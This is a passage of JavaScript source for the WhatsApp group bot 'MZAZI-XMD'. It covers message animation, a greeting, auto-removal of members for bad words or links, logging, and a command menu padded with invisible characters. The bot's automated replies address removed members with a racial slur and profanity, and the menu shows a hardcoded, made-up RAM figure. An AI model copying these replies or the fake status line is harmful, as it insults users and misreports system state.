"𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘",
"𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗",
"𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧",
"𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘",
"𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦",
"𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧",
"𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖",
"𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢",
"𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠",
"𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣",
"𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣𝗟",
"𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘",
"𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧",
"𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘",
"𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗"	
]
let { key } = await client.sendMessage(from, {text: '𝐏𝐢𝐧𝐠𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐧𝐠'})

for (let i = 0; i < Floading.length; i++) {
await client.sendMessage(from, {text: Floading[i], edit: key });
}
	  }
	  const getGreeting = () => {
            const currentHour = DateTime.now().setZone('Africa/Nairobi').hour;

            if (currentHour >= 5 && currentHour < 12) {
                return '𝗚𝗼𝗼𝗱 𝗠𝗼𝗿𝗻𝗶𝗻𝗴 🌅';
            } else if (currentHour >= 12 && currentHour < 16) {
                return '𝗚𝗼𝗼𝗱 𝗔𝗳𝘁𝗲𝗿𝗻𝗼𝗼𝗻 ☀️';
            } else if (currentHour >= 16 && currentHour < 20) {
                return '𝗚𝗼𝗼𝗱 𝗘𝘃𝗲𝗻𝗶𝗻𝗴 🌇';
            } else {
                return '𝗚𝗼𝗼𝗱 𝗡𝗶𝗴𝗵𝘁 😴';
            }
        };


        const getCurrentTimeInNairobi = () => {
            return DateTime.now().setZone('Africa/Nairobi').toLocaleString(DateTime.TIME_SIMPLE);
        };
	
if (badwordkick === 'TRUE' && isBotAdmin && !isAdmin && body && (new RegExp('\\b' + badword.join('\\b|\\b') + '\\b')).test(body.toLowerCase())) {
            
     client.groupParticipantsUpdate(from, [sender], 'remove')
            reply("Hey niggah.\n\nMy owner hates usage of bad words in my presence!")
            
          }
	  
    if (antilink === 'TRUE' && body.includes('chat.whatsapp.com') && !Owner && isBotAdmin && !isAdmin && m.isGroup) { 
  
 kid = m.sender; 
  
 client.sendMessage(m.chat, { 
  
                delete: { 
                   remoteJid: m.chat, 
                   fromMe: false, 
                   id: m.key.id, 
                   participant: kid 
                } 
             }).then(() => client.groupParticipantsUpdate(m.chat, [kid], 'remove')); 
 client.sendMessage(m.chat, {text:`𝑯𝒆𝒚 𝒎𝒐𝒕𝒉𝒆𝒓𝒇*𝒄𝒌𝒆𝒓 @${kid.split("@")[0]}👋\n\n𝒔𝒆𝒏𝒅𝒊𝒏𝒈 𝒍𝒊𝒏𝒌𝒔 𝒊𝒔 𝒑𝒓𝒐𝒉𝒊𝒃𝒊𝒕𝒆𝒅 𝒊𝒏 𝒕𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒃𝒚 𝑴𝒁𝑨𝒁𝑰-𝑿𝑴𝑫!`, contextInfo:{mentionedJid:[kid]}}, {quoted:m}); 
       }   

if (antilinkall === 'TRUE' && body.includes('https://') && !Owner && isBotAdmin && !isAdmin && m.isGroup) { 
  
 ki = m.sender; 
  
 client.sendMessage(m.chat, { 
  
                delete: { 
                   remoteJid: m.chat, 
                   fromMe: false, 
                   id: m.key.id, 
                   participant: ki
                } 
             }).then(() => client.groupParticipantsUpdate(m.chat, [ki], 'remove')); 
 client.sendMessage(m.chat, {text:`𝑯𝒆𝒚 𝑴𝒐𝒕𝒉𝒆𝒓𝒇*𝒄𝒌𝒆𝒓 @${ki.split("@")[0]}👋\n\n𝑺𝒆𝒏𝒅𝒊𝒏𝒈 𝒍𝒊𝒏𝒌𝒔 𝒊𝒔 𝒑𝒓𝒐𝒉𝒊𝒃𝒊𝒕𝒆𝒅 𝒊𝒏 𝒕𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒃𝒚 𝑴𝒁𝑨𝒁𝑰-𝑿𝑴𝑫 !`, contextInfo:{mentionedJid:[ki]}}, {quoted:m}); 
       }   
  
  
  

    if (cmd && !m.isGroup) {
      console.log(chalk.black(chalk.bgWhite("[ 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 ]")), color(argsLog, "turquoise"), chalk.magenta("From"), chalk.green(pushname), chalk.yellow(`[ ${m.sender.replace("@s.whatsapp.net", "")} ]`));
    } else if (cmd && m.isGroup) {
      console.log(
        chalk.black(chalk.bgWhite("[ LOGS ]")),
        color(argsLog, "turquoise"),
        chalk.magenta("From"),
        chalk.green(pushname),
        chalk.yellow(`[ ${m.sender.replace("@s.whatsapp.net", "")} ]`),
        chalk.blueBright("IN"),
        chalk.green(groupName)
      );
    }

    if (cmd) {
      switch (command) {
        case "mzazi2": case "menu2":
		      await mp3d ()
		      
let cap = `𝗛𝗲𝘆 ${m.pushName}😁, ${getGreeting()}\n\n𝐓𝐡𝐢𝐬 𝐢𝐬 𝐌𝐙𝐀𝐙𝐈-𝐗𝐌𝐃, 𝐜𝐫𝐞𝐚𝐭𝐞𝐝 𝐛𝐲 𝐌𝐳𝐚𝐳𝐢\n\n╭═════〘 𝐌𝐙𝐀𝐙𝐈-𝐗𝐌𝐃 〙═════╮
┃✫╭═─────────────────═╮
┃✬│ 𝗨𝘀𝗲𝗿 : ${m.pushName}
┃✬│ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : ꪑɀꪖɀﺃ ꪀꫀꪻ ꪻꫀᥴꫝ ᛕꫀꪀꪗꪖ
┃✫│ 𝗣𝗿𝗲𝗳𝗶𝘅 : ${prefix}
┃✫│ 𝗠𝗼𝗱𝗲 : ${mode}
┃✯│ 𝗦𝗽𝗲𝗲𝗱 :   ${dreadedspeed.toFixed(4)} 𝗠𝘀
┃✬│ 𝗧𝗶𝗺𝗲 : ${getCurrentTimeInNairobi()} on ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi'})}
┃✫│ 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗥𝗔𝗠 : 76𝗚𝗕 𝗼𝗳 256𝗚𝗕
┃✫│═════════════════════
┃✬│𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐌𝐙𝐀𝐙𝐈-𝐗𝐌𝐃 𝐂𝐌𝐃𝐒
‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎┃✫│═════════════════════
╰══──────────────────══╯
●════ 〘 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 〙═──═●
╭══───────◇───────══╮
┃💥│ 𝗦𝘂𝗽𝗽𝗼𝗿𝘁
┃💥│ 𝗔𝗴𝗲𝗻𝘁𝘀
╰══───────◇───────══╯
●════ 〘 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝐂𝐌𝐃𝐒 〙═──═●
╭══───────◇───────══╮
┃💥│ 𝗩𝗶𝗱𝗲𝗼
┃💥│ 𝗣𝗹𝗮𝘆
┃💥│ 𝗣𝗹𝗮𝘆2
┃💥│ 𝗦𝗼𝗻𝗴
┃💥│ 𝗦𝗼𝗻𝗴2
┃💥│ 𝗙𝗯𝗱𝗹
┃💥│ 𝗧𝗶𝗸𝘁𝗼𝗸
┃💥│ 𝗧𝘄𝗶𝘁𝘁𝗲𝗿
┃💥│ 𝗧𝘄𝘁𝗱𝗹
┃💥│ 𝗜𝗴𝗱𝗹
┃💥│ 𝗜𝗴
┃💥│ 𝗙𝗯𝗱𝗹
┃💥│ 𝗙𝗯
┃💥│ 𝗶𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺
┃💥│ 𝗠𝗼𝘃𝗶𝗲
┃💥│ 𝗟𝘆𝗿𝗶𝗰𝘀
┃💥│ 𝗟𝘆𝗿𝗶𝗰𝘀𝗯
┃💥│ 𝗪𝗵𝗮𝘁𝘀𝗼𝗻𝗴
┃💥│ 𝗬𝘁𝘀
┃💥│ 𝗬𝘁𝗺𝗽3
┃💥│ 𝗬𝘁𝗺𝗽4
╰══───────◇───────══╯
●═════  〘 𝗘𝗗𝗜𝗧 𝐂𝐌𝐃𝐒 〙══───═●
╭══───────◇───────══╮
┃💥│ 𝗦𝘁𝗶𝗰𝗸𝗲𝗿
┃💥│ 𝗦𝗺𝗲𝗺𝗲
┃💥│ 𝗣𝗵𝗼𝘁𝗼
┃💥│ 𝗠𝗽4
┃💥│ 𝗥𝗲𝘁𝗿𝗶𝗲𝘃𝗲
┃💥│ 𝗩𝘃
┃💥│ 𝗩𝘃2
┃💥│ 𝐖𝐚𝐡
┃💥│ 𝗦𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁
┃💥│ 𝗠𝗶𝘅
┃💥│ 𝗧𝗮𝗸𝗲
┃💥│ 𝗧𝘄𝗲𝗲𝘁
┃💥│ 𝗤𝘂𝗼𝘁𝗲𝗹𝘆
╰══───────◇───────══╯
●═══〘 𝗖𝗢𝗡𝗙𝗜𝗚 𝗩𝗔𝗥𝗦 𝐂𝐌𝐃𝐒 〙═───═●
╭══───────◇───────══╮
┃💥│ 𝗔𝗻𝘁𝗶𝗱𝗲𝗹𝗲𝘁𝗲
┃💥│ 𝗔𝗻𝘁𝗶𝗰𝗮𝗹𝗹
┃💥│ 𝗔𝗻𝘁𝗶𝗳𝗼𝗿𝗲𝗶𝗴𝗻
┃💥│ 𝗔𝗻𝘁𝗶𝘁𝗮𝗴
┃💥│ 𝗔𝗻𝘁𝗶𝗹𝗶𝗻𝗸
┃💥│ 𝗔𝗻𝘁𝗶𝗹𝗶𝗻𝗸_𝗮𝗹𝗹
┃💥│ 𝗚𝗽𝘁_𝗜𝗻𝗯𝗼𝘅
╰══───────◇───────══╯
●═════  〘 𝗚𝗣𝗧 𝐂𝐌𝐃𝐒 〙═────═●
╭══───────◇───────══╮
┃💥│ 𝗔𝗶
┃💥│ 𝗔𝗶2
┃💥│ 𝗩𝗶𝘀𝗶𝗼𝗻
┃💥│ 𝗗𝗲𝗳𝗶𝗻𝗲
┃💥│ 𝗗𝗮𝗿𝗸𝗴𝗽𝘁
┃💥│ 𝗪𝗶𝗻𝘅𝗲𝘆
┃💥│ 𝗚𝗲𝗺𝗶𝗻𝗶
┃💥│ 𝗚𝗼𝗼𝗴𝗹𝗲
┃💥│ 𝗚𝗽𝘁
┃💥│ 𝗚𝗽𝘁2
┃💥│ 𝗚𝗽𝘁3
╰══───────◇───────══╯
●════  〘 𝗚𝗥𝗢𝗨𝗣 𝐂𝐌𝐃𝐒 〙═───═●
╭══───────◇───────══╮
┃💥│ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲
┃💥│ 𝗥𝗲𝗷𝗲𝗰𝘁
┃💥│ 𝗣𝗿𝗼𝗺𝗼𝘁𝗲
┃💥│ 𝗗𝗲𝗺𝗼𝘁𝗲
┃💥│ 𝗗𝗲𝗹𝗲𝘁𝗲
┃💥│ 𝗥𝗲𝗺𝗼𝘃𝗲
┃💥│ 𝗙𝗮𝗸𝗲𝗿
┃💥│ 𝗙𝗼𝗿𝗲𝗶𝗴𝗻𝗲𝗿𝘀
┃💥│ 𝗖𝗹𝗼𝘀𝗲
┃💥│ 𝗢𝗽𝗲𝗻
┃💥│ 𝗖𝗹𝗼𝘀𝗲𝗧𝗶𝗺𝗲
┃💥│ 𝗢𝗽𝗲𝗻𝗧𝗶𝗺𝗲
┃💥│ 𝗗𝗶𝘀𝗽-𝗼𝗳𝗳
┃💥│ 𝗗𝗶𝘀𝗽-1
┃💥│ 𝗗𝗶𝘀𝗽-7
┃💥│ 𝗗𝗶𝘀𝗽-90
┃💥│ 𝗜𝗰𝗼𝗻
┃💥│ 𝗚𝗰𝗽𝗿𝗼𝗳𝗶𝗹𝗲
┃💥│ 𝗦𝘂𝗯𝗷𝗲𝗰𝘁
┃💥│ 𝗗𝗲𝘀𝗰
┃💥│ 𝗟𝗲𝗮𝘃𝗲
┃💥│ 𝗔𝗱𝗱
┃💥│ 𝗧𝗮𝗴𝗮𝗹𝗹
┃💥│ 𝗛𝗶𝗱𝗲𝘁𝗮𝗴
┃💥│ 𝗥𝗲𝘃𝗼𝗸𝗲
┃💥│ 𝗠𝘂𝘁𝗲
┃💥│ 𝗨𝗻𝗺𝘂𝘁𝗲
┃💥│ 𝗚𝗿𝗼𝘂𝗽𝗽𝗶𝗰
╰══───────◇───────══╯
